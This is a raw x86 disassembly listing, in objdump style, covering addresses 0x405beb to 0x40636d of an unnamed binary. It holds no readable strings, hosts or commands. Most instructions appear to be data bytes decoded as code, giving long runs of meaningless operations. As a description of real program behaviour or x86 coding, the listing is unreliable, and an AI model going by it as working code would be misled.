  405beb:	adc    eax,0x60156
  405bf0:	jno    0x405c07
  405bf2:	push   esi
  405bf3:	add    DWORD PTR [esi],eax
  405bf5:	add    BYTE PTR [eax+0x6015615],ah
  405bfb:	add    al,al
  405bfd:	adc    eax,0x60156
  405c02:	int    0x15
  405c04:	xor    BYTE PTR [ecx],al
  405c06:	push   es
  405c07:	add    cl,bh
  405c09:	adc    eax,0x60130
  405c0e:	add    BYTE PTR [esi],dl
  405c10:	mov    eax,ds:0x1a000609
  405c15:	push   ss
  405c16:	mov    eax,ds:0x32000609
  405c1b:	push   ss
  405c1c:	mov    eax,ds:0x65000609
  405c21:	push   ss
  405c22:	push   esi
  405c23:	add    DWORD PTR [esi],eax
  405c25:	add    BYTE PTR [ebx+0x16],dh
  405c28:	push   esi
  405c29:	add    DWORD PTR [esi],eax
  405c2b:	add    BYTE PTR [edx+0x6015616],cl
  405c31:	add    BYTE PTR [ebx+0x6015616],bl
  405c37:	add    al,al
  405c39:	push   ss
  405c3a:	xor    BYTE PTR [ecx],al
  405c3c:	push   es
  405c3d:	add    BYTE PTR ds:0x6013017,dl
  405c43:	add    BYTE PTR [esi],ah
  405c45:	pop    ss
  405c46:	rcl    BYTE PTR [eax],1
  405c48:	push   es
  405c49:	add    BYTE PTR [edx+0x17],al
  405c4c:	in     al,0x11
  405c4e:	push   es
  405c4f:	add    BYTE PTR [eax+0x17],bl
  405c52:	push   esi
  405c53:	add    DWORD PTR [esi],eax
  405c55:	add    BYTE PTR [ebp+0x6013001],ch
  405c5b:	add    BYTE PTR [edi+0x60aa417],dh
  405c61:	add    cl,al
  405c63:	pop    ss
  405c64:	in     al,0x11
  405c66:	push   es
  405c67:	add    ah,cl
  405c69:	pop    ss
  405c6a:	in     al,0x11
  405c6c:	push   es
  405c6d:	add    ch,dl
  405c6f:	pop    ss
  405c70:	in     al,0x11
  405c72:	push   es
  405c73:	add    al,ah
  405c75:	pop    ss
  405c76:	in     al,0x11
  405c78:	push   es
  405c79:	add    ch,ch
  405c7b:	pop    ss
  405c7c:	in     al,0x11
  405c7e:	push   es
  405c7f:	add    BYTE PTR [ebx],al
  405c81:	sbb    ah,ah
  405c83:	adc    DWORD PTR [esi],eax
  405c85:	add    BYTE PTR [eax],ah
  405c87:	sbb    ah,ah
  405c89:	adc    DWORD PTR [esi],eax
  405c8b:	add    BYTE PTR [eax+ebx*1-0x1c],cl
  405c8f:	adc    DWORD PTR [eax],eax
  405c91:	add    BYTE PTR [eax],al
  405c93:	add    BYTE PTR [ecx],al
  405c95:	add    BYTE PTR [eax],al
  405c97:	add    BYTE PTR [eax],al
  405c99:	add    BYTE PTR [ecx],al
  405c9b:	add    BYTE PTR [ecx],al
  405c9d:	add    BYTE PTR [eax+0x15001001],al
  405ca3:	add    BYTE PTR [eax],al
  405ca5:	add    BYTE PTR ds:0x1000100,al
  405cab:	add    BYTE PTR [eax+0x22001001],al
  405cb1:	add    BYTE PTR [eax],al
  405cb3:	add    BYTE PTR ds:0x1000200,al
  405cb9:	add    BYTE PTR [eax+0x2f001001],al
  405cbf:	add    BYTE PTR [eax],al
  405cc1:	add    BYTE PTR ds:0x1000300,al
  405cc7:	add    BYTE PTR [eax+0x3a001001],al
  405ccd:	add    BYTE PTR [eax],al
  405ccf:	add    BYTE PTR ds:0x1000400,al
  405cd5:	add    BYTE PTR [eax+0x47001001],al
  405cdb:	add    BYTE PTR [eax],al
  405cdd:	add    BYTE PTR ds:0x1000b00,al
  405ce3:	add    BYTE PTR [eax],al
  405ce5:	add    BYTE PTR [eax],dl
  405ce7:	add    BYTE PTR [ebx+0x0],dl
  405cea:	pop    esp
  405ceb:	add    BYTE PTR ds:0x1003e00,al
  405cf1:	add    BYTE PTR [eax],al
  405cf3:	add    BYTE PTR [eax],dl
  405cf5:	add    BYTE PTR [eax+eax*1+0x5c],bl
  405cf9:	add    BYTE PTR ds:0xc003f00,al
  405cff:	add    BYTE PTR [eax],al
  405d01:	add    BYTE PTR [eax],dl
  405d03:	add    BYTE PTR [ebx+0x0],ah
  405d06:	pop    esp
  405d07:	add    BYTE PTR ds:0x18004300,al
  405d0d:	add    BYTE PTR [eax],al
  405d0f:	add    BYTE PTR [eax],dl
  405d11:	add    BYTE PTR [edx+0x0],ch
  405d14:	pop    esp
  405d15:	add    BYTE PTR ds:0x1b004500,al
  405d1b:	add    BYTE PTR [eax],al
  405d1d:	add    BYTE PTR [eax],dl
  405d1f:	add    BYTE PTR [edx+0x0],dh
  405d22:	pop    esp
  405d23:	add    BYTE PTR ds:0x1d004800,al
  405d29:	add    BYTE PTR [ecx],al
  405d2b:	add    BYTE PTR [eax],dl
  405d2d:	add    BYTE PTR [esi+0x0],bh
  405d30:	mov    eax,DWORD PTR [eax]
  405d32:	or     DWORD PTR [eax],eax
  405d34:	dec    ebp
  405d35:	add    BYTE PTR [edx],ah
  405d37:	add    BYTE PTR [eax],al
  405d39:	add    DWORD PTR [eax],eax
  405d3b:	add    BYTE PTR [esi+0xd008b00],dl
  405d41:	add    BYTE PTR [ebp+0x0],cl
  405d44:	and    al,0x0
  405d46:	add    BYTE PTR [eax],al
  405d48:	adc    BYTE PTR [eax],al
  405d4a:	sahf   
  405d4b:	add    BYTE PTR [ebx+0x53000500],cl
  405d51:	add    BYTE PTR [eax+eax*1],ah
  405d54:	add    BYTE PTR [eax],al
  405d56:	adc    BYTE PTR [eax],al
  405d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d59:	add    BYTE PTR [ebx+0x56000500],cl
  405d5f:	add    BYTE PTR [edx],ch
  405d61:	add    BYTE PTR [eax],al
  405d63:	add    BYTE PTR [eax],dl
  405d65:	add    BYTE PTR [ebx+0x5008b00],cl
  405d6b:	add    BYTE PTR [eax+0x0],bl
  405d6e:	add    BYTE PTR cs:[eax-0x4ffffff0],ah
  405d75:	add    BYTE PTR [ebx+0x5e000000],cl
  405d7b:	add    BYTE PTR [ecx+0x0],al
  405d7e:	add    BYTE PTR [eax],al
  405d80:	adc    BYTE PTR [eax],al
  405d82:	rol    DWORD PTR [eax],0x8b
  405d85:	add    BYTE PTR ds:0x42005e00,al
  405d8b:	add    BYTE PTR [eax],al
  405d8d:	add    BYTE PTR [eax],dl
  405d8f:	add    al,dl
  405d91:	add    BYTE PTR [ebx+0x5e000500],cl
  405d97:	add    BYTE PTR [eax+eax*1-0x60],al
  405d9b:	adc    BYTE PTR [eax],al
  405d9d:	add    cl,ah
  405d9f:	add    BYTE PTR [ebx+0x5f000000],cl
  405da5:	add    BYTE PTR [esi+0x0],al
  405da8:	add    BYTE PTR [eax],al
  405daa:	adc    BYTE PTR [eax],al
  405dac:	icebp  
  405dad:	add    BYTE PTR [ebx+0x5f000500],cl
  405db3:	add    BYTE PTR [eax+0x0],dl
  405db6:	add    DWORD PTR [ecx],eax
  405db8:	adc    BYTE PTR [eax],al
  405dba:	add    al,BYTE PTR [ecx]
  405dbc:	mov    eax,DWORD PTR [eax]
  405dbe:	add    eax,0x54005f00
  405dc3:	add    BYTE PTR [eax],al
  405dc5:	add    BYTE PTR [eax],dl
  405dc7:	add    BYTE PTR [eax],dl
  405dc9:	add    DWORD PTR [edi],edx
  405dcb:	add    DWORD PTR ds:0x55006a00,eax
  405dd1:	add    BYTE PTR [ebx-0x80],dl
  405dd4:	lods   eax,DWORD PTR ds:[esi]
  405dd5:	add    DWORD PTR [edx],ecx
  405dd7:	add    BYTE PTR [ebx-0x80],dl
  405dda:	lods   eax,DWORD PTR ds:[esi]
  405ddb:	add    DWORD PTR [edx],ecx
  405ddd:	add    BYTE PTR [ebx-0x80],dl
  405de0:	lods   eax,DWORD PTR ds:[esi]
  405de1:	add    DWORD PTR [edx],ecx
  405de3:	add    BYTE PTR [ebx-0x80],dl
  405de6:	mov    ch,0x1
  405de8:	or     al,BYTE PTR [eax]
  405dea:	push   ebx
  405deb:	cmp    BYTE PTR [ebx+0x53000a01],0x80
  405df2:	mov    DWORD PTR [ecx],0x8053000a
  405df8:	aam    0x1
  405dfa:	or     al,BYTE PTR [eax]
  405dfc:	push   ebx
  405dfd:	sub    BYTE PTR [ebp+0x53000a01],0x80
  405e04:	fiadd  WORD PTR [ecx]
  405e06:	or     al,BYTE PTR [eax]
  405e08:	push   ebx
  405e09:	xor    bl,0x1
  405e0c:	mov    ah,0x0
  405e0e:	push   ebx
  405e0f:	add    BYTE PTR [edx+eax*1],0xa
  405e13:	add    BYTE PTR [ebx-0x80],dl
  405e16:	adc    al,BYTE PTR [edx]
  405e18:	or     al,BYTE PTR [eax]
  405e1a:	push   ebx
  405e1b:	and    BYTE PTR ds:0x53000a02,0x80
  405e22:	aaa    
  405e23:	add    cl,BYTE PTR [edx]
  405e25:	add    BYTE PTR [ebx-0x80],dl
  405e28:	inc    eax
  405e29:	add    cl,BYTE PTR [edx]
  405e2b:	add    BYTE PTR [ebx-0x80],dl
  405e2e:	dec    ebx
  405e2f:	add    cl,BYTE PTR [edx]
  405e31:	add    BYTE PTR [ebx-0x80],dl
  405e34:	xor    BYTE PTR [ecx],al
  405e36:	or     al,BYTE PTR [eax]
  405e38:	push   ebx
  405e39:	and    BYTE PTR [edx+0x2],0xa
  405e3d:	add    BYTE PTR [ebx-0x80],dl
  405e40:	js     0x405e44
  405e42:	or     al,BYTE PTR [eax]
  405e44:	push   ebx
  405e45:	or     BYTE PTR [ebx+0x53000a02],0x80
  405e4c:	xchg   ebp,eax
  405e4d:	add    cl,BYTE PTR [edx]
  405e4f:	add    BYTE PTR [ebx-0x80],dl
  405e52:	test   al,0x2
  405e54:	or     al,BYTE PTR [eax]
  405e56:	push   ebx
  405e57:	add    al,0x2
  405e5a:	or     al,BYTE PTR [eax]
  405e5c:	push   ebx
  405e5d:	adc    bh,0x2
  405e60:	or     al,BYTE PTR [eax]
  405e62:	push   ebx
  405e63:	sub    dl,0x2
  405e66:	or     al,BYTE PTR [eax]
  405e68:	push   ebx
  405e69:	add    BYTE PTR [edx],0x3
  405e6c:	or     al,BYTE PTR [eax]
  405e6e:	push   ebx
  405e6f:	sbb    BYTE PTR [ecx],0x3
  405e72:	or     al,BYTE PTR [eax]
  405e74:	push   ebx
  405e75:	cmp    BYTE PTR ds:0x53000a03,0x80
  405e7c:	push   ecx
  405e7d:	add    ecx,DWORD PTR [edx]
  405e7f:	add    BYTE PTR [ebx-0x80],dl
  405e82:	ins    BYTE PTR es:[edi],dx
  405e83:	add    ecx,DWORD PTR [edx]
  405e85:	add    BYTE PTR [ebx-0x80],dl
  405e88:	jge    0x405e8d
  405e8a:	or     al,BYTE PTR [eax]
  405e8c:	push   ebx
  405e8d:	or     BYTE PTR [edx+0x53000a03],0x80
  405e94:	mov    ds:0x53000a03,al
  405e99:	xor    BYTE PTR [esi+0x53000a03],0x80
  405ea0:	les    eax,FWORD PTR [ebx]
  405ea2:	or     al,BYTE PTR [eax]
  405ea4:	push   ebx
  405ea5:	sbb    ch,0x3
  405ea8:	or     al,BYTE PTR [eax]
  405eaa:	push   ebx
  405eab:	sub    dh,0x3
  405eae:	or     al,BYTE PTR [eax]
  405eb0:	push   ebx
  405eb1:	cmp    dh,0x3
  405eb4:	or     al,BYTE PTR [eax]
  405eb6:	push   ebx
  405eb7:	and    BYTE PTR [edi],0x4
  405eba:	or     al,BYTE PTR [eax]
  405ebc:	push   ebx
  405ebd:	xor    BYTE PTR [esi],0x4
  405ec0:	or     al,BYTE PTR [eax]
  405ec2:	push   ebx
  405ec3:	or     BYTE PTR [ebx+0x4],0xa
  405ec7:	add    BYTE PTR [ebx-0x80],dl
  405eca:	push   ebp
  405ecb:	add    al,0xa
  405ecd:	add    BYTE PTR [ebx-0x80],dl
  405ed0:	imul   eax,DWORD PTR [edx+ecx*1],0x0
  405ed4:	push   ebx
  405ed5:	add    BYTE PTR [eax+0x53000a04],0x80
  405edc:	fwait
  405edd:	add    al,0xa
  405edf:	add    BYTE PTR [ebx-0x80],dl
  405ee2:	mov    cl,0x4
  405ee4:	or     al,BYTE PTR [eax]
  405ee6:	push   ebx
  405ee7:	add    ch,0x4
  405eea:	or     al,BYTE PTR [eax]
  405eec:	push   ebx
  405eed:	sbb    bh,0x4
  405ef0:	or     al,BYTE PTR [eax]
  405ef2:	push   ebx
  405ef3:	sub    bh,0x4
  405ef6:	or     al,BYTE PTR [eax]
  405ef8:	push   ebx
  405ef9:	or     BYTE PTR [ebx],0x5
  405efc:	or     al,BYTE PTR [eax]
  405efe:	push   ebx
  405eff:	sbb    BYTE PTR [eax*1-0x7facfff6],0x2e
  405f07:	add    eax,0x8053000a
  405f0c:	inc    esp
  405f0d:	add    eax,0x8053000a
  405f12:	add    ax,0xa
  405f16:	push   ebx
  405f17:	cmp    BYTE PTR [edx+0x5],0xa
  405f1b:	add    BYTE PTR [ebx-0x80],dl
  405f1e:	xchg   edx,eax
  405f1f:	add    eax,0x8053000a
  405f24:	test   al,0x5
  405f26:	or     al,BYTE PTR [eax]
  405f28:	push   ebx
  405f29:	cmp    BYTE PTR [ebp+eax*1-0x7facfff6],0xd5
  405f31:	add    eax,0x8053000a
  405f36:	call   0x53406940
  405f3b:	add    BYTE PTR [edx],0x6
  405f3e:	or     al,BYTE PTR [eax]
  405f40:	adc    DWORD PTR [eax],eax
  405f42:	xor    al,0x6
  405f44:	sbb    DWORD PTR [ebx],esp
  405f46:	push   ecx
  405f47:	cmp    BYTE PTR [edi+0x6],0xb4
  405f4b:	add    BYTE PTR [ecx-0x80],dl
  405f4e:	xchg   ecx,eax
  405f4f:	push   es
  405f50:	mov    ah,0x0
  405f52:	push   ecx
  405f53:	and    BYTE PTR [ecx+0x1300b406],0x0
  405f5a:	cmp    al,0x7
  405f5c:	xchg   ebx,eax
  405f5d:	and    eax,DWORD PTR [ecx]
  405f5f:	add    BYTE PTR [esi+0x7],al
  405f62:	or     al,BYTE PTR [eax]
  405f64:	add    DWORD PTR [eax],eax
  405f66:	push   eax
  405f67:	pop    es
  405f68:	or     al,BYTE PTR [eax]
  405f6a:	add    DWORD PTR [eax],eax
  405f6c:	jns    0x405f75
  405f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6f:	and    eax,DWORD PTR [ecx]
  405f71:	add    BYTE PTR [edi+eax*1+0x123a9],al
  405f78:	xchg   ebp,eax
  405f79:	pop    es
  405f7a:	test   eax,0xac000123
  405f7f:	pop    es
  405f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f81:	and    eax,DWORD PTR [ecx]
  405f83:	add    BYTE PTR [edi+0x123bc07],dh
  405f89:	add    dl,al
  405f8b:	pop    es
  405f8c:	mov    ah,0x0
  405f8e:	add    DWORD PTR [eax],eax
  405f90:	iret   
  405f91:	pop    es
  405f92:	mov    ah,0x0
  405f94:	add    DWORD PTR [eax],eax
  405f96:	fadd   QWORD PTR [edi]
  405f98:	shl    DWORD PTR [ebx],0x6
  405f9b:	push   es
  405f9c:	inc    edx
  405f9d:	or     BYTE PTR [eax+eax*1+0x84a8056],dh
  405fa4:	in     al,dx
  405fa5:	and    edx,DWORD PTR [esi-0x80]
  405fa8:	pop    edx
  405fa9:	or     ah,ch
  405fab:	and    edx,DWORD PTR [esi-0x80]
  405fae:	imul   ecx,DWORD PTR [eax],0xffffffec
  405fb1:	and    edx,DWORD PTR [esi-0x80]
  405fb4:	js     0x405fbe
  405fb6:	in     al,dx
  405fb7:	and    edx,DWORD PTR [esi-0x80]
  405fba:	xchg   edx,eax
  405fbb:	or     ah,ch
  405fbd:	and    eax,DWORD PTR [ecx]
  405fbf:	add    al,dh
  405fc1:	or     BYTE PTR [esi],dl
  405fc3:	and    al,0x1
  405fc5:	add    dh,dh
  405fc7:	or     BYTE PTR [eax+eax*1+0x9030001],dh
  405fce:	mov    ah,0x0
  405fd0:	add    DWORD PTR [eax],eax
  405fd2:	or     DWORD PTR [ecx],0x1000a
  405fd8:	lea    ecx,[ecx]
  405fda:	das    
  405fdb:	and    al,0x51
  405fdd:	cmp    BYTE PTR [edi+0x6],0xb4
  405fe1:	add    BYTE PTR [ecx-0x80],dl
  405fe4:	xchg   ecx,eax
  405fe5:	push   es
  405fe6:	mov    ah,0x0
  405fe8:	push   ecx
  405fe9:	and    BYTE PTR [ecx+0x1300b406],0x0
  405ff0:	cmp    al,0x7
  405ff2:	xchg   ebx,eax
  405ff3:	and    edx,DWORD PTR [ebx]
  405ff5:	add    cl,al
  405ff7:	or     bl,BYTE PTR [esi-0x2effeedc]
  405ffd:	or     ah,BYTE PTR [edx-0x14fffedc]
  406003:	or     ah,BYTE PTR [ebp-0x3dfff9dd]
  406009:	or     ecx,DWORD PTR [edx]
  40600b:	add    BYTE PTR [esi],al
  40600d:	add    ah,dl
  40600f:	or     ecx,DWORD PTR [edx]
  406011:	add    BYTE PTR [esi],al
  406013:	add    ch,ah
  406015:	or     ecx,DWORD PTR [edx]
  406017:	add    BYTE PTR [esi],al
  406019:	add    ah,dh
  40601b:	or     ecx,DWORD PTR [edx]
  40601d:	add    BYTE PTR [esi],al
  40601f:	add    BYTE PTR [edi],al
  406021:	or     al,0xa5
  406023:	and    eax,DWORD PTR [esi]
  406025:	add    BYTE PTR [esp+ecx*1],dl
  406028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406029:	and    eax,DWORD PTR [esi]
  40602b:	add    BYTE PTR ds:0x6000a0c,ah
  406031:	add    BYTE PTR [edx],dh
  406033:	or     al,0xcc
  406035:	and    al,0x6
  406037:	add    BYTE PTR [esp+ecx*1],bh
  40603a:	int3   
  40603b:	and    al,0x6
  40603d:	add    BYTE PTR [edx+0xc],cl
  406040:	int3   
  406041:	and    al,0x6
  406043:	add    BYTE PTR [ecx+0xc],bl
  406046:	iret   
  406047:	and    al,0x11
  406049:	add    BYTE PTR [ebp-0x2fdb33f4],cl
  40604f:	and    BYTE PTR [eax],al
  406051:	add    BYTE PTR [eax],al
  406053:	add    BYTE PTR [ecx+0x1d063c00],dl
  406059:	and    eax,DWORD PTR [ecx]
  40605b:	add    al,bh
  40605d:	and    BYTE PTR [eax],al
  40605f:	add    BYTE PTR [eax],al
  406061:	add    BYTE PTR [ebx+0x21065000],dl
  406067:	and    eax,DWORD PTR [ecx]
  406069:	add    BYTE PTR [eax],ch
  40606b:	and    DWORD PTR [eax],eax
  40606d:	add    BYTE PTR [eax],al
  40606f:	add    BYTE PTR [ebx+0x21065a00],dl
  406075:	and    eax,DWORD PTR [edx]
  406077:	add    BYTE PTR [eax+0x21],cl
  40607a:	add    BYTE PTR [eax],al
  40607c:	add    BYTE PTR [eax],al
  40607e:	xchg   ebx,eax
  40607f:	add    BYTE PTR [esi+eax*1+0x21],ch
  406083:	and    eax,DWORD PTR [ebx]
  406085:	add    BYTE PTR [eax+0x21],dl
  406088:	add    BYTE PTR [eax],al
  40608a:	add    BYTE PTR [eax],al
  40608c:	xchg   ebx,eax
  40608d:	add    BYTE PTR [esi+eax*1+0x26],ch
  406091:	and    eax,DWORD PTR [eax+eax*1]
  406094:	pop    esi
  406095:	and    DWORD PTR [eax],eax
  406097:	add    BYTE PTR [eax],al
  406099:	add    BYTE PTR [ebx+0x2c066c00],dl
  40609f:	and    eax,DWORD PTR [esi]
  4060a1:	add    BYTE PTR [ebp+0x21],ch
  4060a4:	add    BYTE PTR [eax],al
  4060a6:	add    BYTE PTR [eax],al
  4060a8:	xchg   ebx,eax
  4060a9:	add    BYTE PTR [esi+eax*1+0x33],ch
  4060ad:	and    ecx,DWORD PTR [ecx]
  4060af:	add    BYTE PTR [eax+0x21],al
  4060b5:	add    BYTE PTR [ebx+0x3b066c00],dl
  4060bb:	and    ecx,DWORD PTR ds:0x21b400
  4060c1:	add    BYTE PTR [eax],al
  4060c3:	add    BYTE PTR [ebx+0x44066c00],dl
  4060c9:	and    edx,DWORD PTR [edx]
  4060cb:	add    ah,ch
  4060cd:	and    DWORD PTR [eax],eax
  4060cf:	add    BYTE PTR [eax],al
  4060d1:	add    BYTE PTR [ebx+0x4e066c00],dl
  4060d7:	and    ebx,DWORD PTR [eax]
  4060d9:	add    BYTE PTR [edi],ah
  4060db:	and    al,BYTE PTR [eax]
  4060dd:	add    BYTE PTR [eax],al
  4060df:	add    BYTE PTR [esi+0x59067918],al
  4060e5:	and    ebx,DWORD PTR [edi]
  4060e7:	add    BYTE PTR [eax],dh
  4060e9:	and    al,BYTE PTR [eax]
  4060eb:	add    BYTE PTR [eax],al
  4060ed:	add    BYTE PTR [esi+0x6c06aa00],dl
  4060f3:	and    ebx,DWORD PTR [edi]
  4060f5:	add    BYTE PTR [edx+eiz*1+0x0],ch
  4060f9:	add    BYTE PTR [eax],al
  4060fb:	add    BYTE PTR [esi+0x7206af00],dl
  406101:	and    esp,DWORD PTR [eax]
  406103:	add    BYTE PTR [eax+0x25],dl
  406109:	add    BYTE PTR [ecx+0x1d06b300],dl
  40610f:	and    esp,DWORD PTR [eax]
  406111:	add    BYTE PTR [eax],cl
  406113:	add    BYTE PTR es:[eax],al
  406116:	add    BYTE PTR [eax],al
  406118:	xchg   ecx,eax
  406119:	add    al,al
  40611b:	push   es
  40611c:	and    DWORD PTR [ebx],esp
  40611e:	and    BYTE PTR [eax],al
  406120:	xchg   esp,eax
  406121:	add    BYTE PTR es:[eax],al
  406124:	add    BYTE PTR [eax],al
  406126:	xchg   ecx,eax
  406127:	add    ah,cl
  406129:	push   es
  40612a:	and    DWORD PTR [ebx],esp
  40612c:	and    DWORD PTR [eax],eax
  40612e:	mov    ah,0x26
  406130:	add    BYTE PTR [eax],al
  406132:	add    BYTE PTR [eax],al
  406134:	xchg   ecx,eax
  406135:	add    ah,bl
  406137:	push   es
  406138:	jbe    0x40615d
  40613a:	and    al,BYTE PTR [eax]
  40613c:	adc    al,0x2b
  40613e:	add    BYTE PTR [eax],al
  406140:	add    BYTE PTR [eax],al
  406142:	xchg   ecx,eax
  406143:	add    bl,ch
  406145:	push   es
  406146:	sbb    eax,0x38002523
  40614b:	sub    eax,DWORD PTR [eax]
  40614d:	add    BYTE PTR [eax],al
  40614f:	add    BYTE PTR [ecx+0x1d06f500],dl
  406155:	and    esp,DWORD PTR ds:0x0
  40615b:	add    BYTE PTR [eax+0x1a209600],al
  406161:	pop    es
  406162:	and    DWORD PTR [ebx],0x25
  406168:	add    BYTE PTR [eax],al
  40616a:	add    BYTE PTR [eax],0x91
  40616d:	and    BYTE PTR ds:0x2b238d07,ah
  406173:	add    BYTE PTR [ecx+0x2b],bl
  406179:	add    BYTE PTR [esi+0x59067918],al
  40617f:	and    ebp,DWORD PTR ds:0x2b9700
  406185:	add    BYTE PTR [eax],al
  406187:	add    BYTE PTR [ecx+0x1d14f318],dl
  40618d:	and    ebp,DWORD PTR ds:0x2ba100
  406193:	add    BYTE PTR [eax],al
  406195:	add    BYTE PTR [esi-0x68f986e8],al
  40619b:	and    ebp,DWORD PTR ds:0x2bb700
  4061a1:	add    BYTE PTR [eax],al
  4061a3:	add    BYTE PTR [esi-0x62f8a4f8],al
  4061a9:	and    ebp,DWORD PTR [edi]
  4061ab:	add    BYTE PTR [edi+0x2b],bh
  4061b1:	add    BYTE PTR [esi-0x62f89bf8],al
  4061b7:	and    ebp,DWORD PTR [edi]
  4061b9:	add    al,cl
  4061bb:	sub    eax,DWORD PTR [eax]
  4061bd:	add    BYTE PTR [eax],al
  4061bf:	add    BYTE PTR [esi-0x52f986e8],al
  4061c5:	and    ebp,DWORD PTR [edi]
  4061c7:	add    BYTE PTR [esp+ebp*1+0x0],bh
  4061cb:	add    BYTE PTR [eax],al
  4061cd:	add    BYTE PTR [esi-0x4cf85b00],al
  4061d3:	and    esi,DWORD PTR [eax]
  4061d5:	add    BYTE PTR [ebp*1+0x0],dh
  4061dc:	xchg   BYTE PTR [eax],bl
  4061de:	jns    0x4061e6
  4061e0:	lds    esp,FWORD PTR [ebx]
  4061e2:	xor    eax,DWORD PTR [eax]
  4061e4:	or     ch,BYTE PTR [edi]
  4061e6:	add    BYTE PTR [eax],al
  4061e8:	add    BYTE PTR [eax],al
  4061ea:	xchg   BYTE PTR [eax],cl
  4061ec:	in     al,dx
  4061ed:	pop    es
  4061ee:	int    0x23
  4061f0:	xor    eax,0x2f1400
  4061f5:	add    BYTE PTR [eax],al
  4061f7:	add    BYTE PTR [esi-0x32f807f8],al
  4061fd:	and    esi,DWORD PTR ds:0x2f2000
  406203:	add    BYTE PTR [eax],al
  406205:	add    BYTE PTR [esi-0x62f7fc00],al
  40620b:	and    esi,DWORD PTR ds:0x2f5800
  406211:	add    BYTE PTR [eax],al
  406213:	add    BYTE PTR [esi-0x2ef7f100],al
  406219:	and    esi,DWORD PTR ds:0x2f9000
  40621f:	add    BYTE PTR [eax],al
  406221:	add    BYTE PTR [esi-0x25f95100],al
  406227:	and    esi,DWORD PTR ds:0x2ffe00
  40622d:	add    BYTE PTR [eax],al
  40622f:	add    BYTE PTR [esi+0x59067918],al
  406235:	and    eax,DWORD PTR [eax+0x0]
  406238:	push   es
  406239:	xor    BYTE PTR [eax],al
  40623b:	add    BYTE PTR [eax],al
  40623d:	add    BYTE PTR [ebx+0x4067918],al
  406243:	and    al,0x40
  406245:	add    BYTE PTR [eax+esi*1],ah
  406248:	add    BYTE PTR [eax],al
  40624a:	add    BYTE PTR [eax],al
  40624c:	mov    BYTE PTR [eax],0xb1
  40624f:	or     BYTE PTR [esp],cl
  406252:	inc    ebx
  406253:	add    BYTE PTR [esi+0x30],ch
  406256:	add    BYTE PTR [eax],al
  406258:	add    BYTE PTR [eax],al
  40625a:	mov    BYTE PTR [eax],0xb8
  40625d:	or     ch,cl
  40625f:	and    eax,DWORD PTR [eax+eax*1-0x71]
  406263:	xor    BYTE PTR [eax],al
  406265:	add    BYTE PTR [eax],al
  406267:	add    BYTE PTR [esi+0x1108c408],al
  40626d:	and    al,0x44
  40626f:	add    BYTE PTR [edi+0x30],dl
  406275:	add    BYTE PTR [esi-0x32f731f8],al
  40627b:	and    eax,DWORD PTR [eax+eax*1-0x61]
  40627f:	xor    BYTE PTR [eax],al
  406281:	add    BYTE PTR [eax],al
  406283:	add    BYTE PTR [esi-0x32f720f8],al
  406289:	and    eax,DWORD PTR [eax+eax*1-0x59]
  40628d:	xor    BYTE PTR [eax],al
  40628f:	add    BYTE PTR [eax],al
  406291:	add    BYTE PTR [esi+0x1f067918],al
  406297:	and    al,0x44
  406299:	add    BYTE PTR [esi+0x30],dh
  40629f:	add    BYTE PTR [esi-0x62f6cff8],al
  4062a5:	and    eax,DWORD PTR [ebp+0x0]
  4062a8:	mov    esi,0x30
  4062ad:	add    BYTE PTR [esi+0x24097108],al
  4062b3:	and    al,0x45
  4062b5:	add    dh,al
  4062b7:	xor    BYTE PTR [eax],al
  4062b9:	add    BYTE PTR [eax],al
  4062bb:	add    BYTE PTR [esi+0x29097908],al
  4062c1:	and    al,0x45
  4062c3:	add    al,dl
  4062c5:	xor    BYTE PTR [eax],al
  4062c7:	add    BYTE PTR [eax],al
  4062c9:	add    BYTE PTR [esi+0x3806af00],dl
  4062cf:	and    al,0x46
  4062d1:	add    BYTE PTR [edx+esi*1],bh
  4062d4:	add    BYTE PTR [eax],al
  4062d6:	add    BYTE PTR [eax],al
  4062d8:	xchg   esi,eax
  4062d9:	add    BYTE PTR [ecx+ecx*1+0x47243e],bh
  4062e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062e1:	xor    al,BYTE PTR [eax]
  4062e3:	add    BYTE PTR [eax],al
  4062e5:	add    BYTE PTR [ecx+0x4609c500],dl
  4062eb:	and    al,0x49
  4062ed:	add    al,dl
  4062ef:	xor    al,BYTE PTR [eax]
  4062f1:	add    BYTE PTR [eax],al
  4062f3:	add    BYTE PTR [ecx+0x4b09dc00],dl
  4062f9:	and    al,0x49
  4062fb:	add    ah,bh
  4062fd:	xor    al,BYTE PTR [eax]
  4062ff:	add    BYTE PTR [eax],al
  406301:	add    BYTE PTR [ecx+0x5109ec00],dl
  406307:	and    al,0x4a
  406309:	add    BYTE PTR [eax+0x34],ch
  40630c:	add    BYTE PTR [eax],al
  40630e:	add    BYTE PTR [eax],al
  406310:	xchg   ebx,eax
  406311:	add    ah,bh
  406313:	or     DWORD PTR [ebp+0x24],edx
  406316:	dec    edx
  406317:	add    BYTE PTR [eax],al
  406319:	add    BYTE PTR ss:[eax],al
  40631c:	add    BYTE PTR [eax],al
  40631e:	xchg   ebx,eax
  40631f:	add    BYTE PTR [edx],cl
  406321:	or     bl,BYTE PTR [ebp+0x24]
  406324:	dec    esp
  406325:	add    BYTE PTR [esi+esi*1+0x0],cl
  406329:	add    BYTE PTR [eax],al
  40632b:	add    BYTE PTR [ebx+0x650a1500],dl
  406331:	and    al,0x4e
  406333:	add    BYTE PTR [eax+0x36],dl
  406339:	add    BYTE PTR [ebx+0x650a2400],dl
  40633f:	and    al,0x50
  406341:	add    bl,bl
  406343:	add    BYTE PTR ss:[eax],al
  406346:	add    BYTE PTR [eax],al
  406348:	xchg   ebx,eax
  406349:	add    BYTE PTR [edi],dh
  40634b:	or     ch,BYTE PTR [ebp+0x24]
  40634e:	push   edx
  40634f:	add    bh,ah
  406351:	add    BYTE PTR ss:[eax],al
  406354:	add    BYTE PTR [eax],al
  406356:	xchg   ebx,eax
  406357:	add    BYTE PTR [ebp+0xa],al
  40635a:	ins    DWORD PTR es:[edi],dx
  40635b:	and    al,0x53
  40635d:	add    bl,dh
  40635f:	add    BYTE PTR ss:[eax],al
  406362:	add    BYTE PTR [eax],al
  406364:	xchg   ebx,eax
  406365:	add    BYTE PTR [ebp+0xa],bl
  406368:	jae    0x40638e
  40636a:	push   esp
  40636b:	add    BYTE PTR [eax],al
  40636d:	add    BYTE PTR [eax],al
